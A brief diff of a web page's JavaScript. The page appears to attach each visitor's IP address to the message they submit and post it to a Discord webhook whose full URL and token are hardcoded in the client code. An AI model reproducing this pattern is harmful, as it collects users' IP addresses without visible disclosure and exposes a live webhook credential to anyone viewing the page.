@@ -113,7 +113,7 @@ p {
       const userIP = data.ip;
       const messageInput = document.getElementById("messageInput");
       const message = {
-        content: messageInput.value + " IP ADRESS ${userIP}"
+        content: messageInput.value + " IP ADRESS" + userIP
       };
 
       const response = await fetch("https://discord.com/api/webhooks/1073693447006982234/2kuW2Zt3yN_MAVkZvwLZKTb9zxmvkumZD-FcO-gpZaBruy-orBX0mio3_wh-U_BoNwyM", {
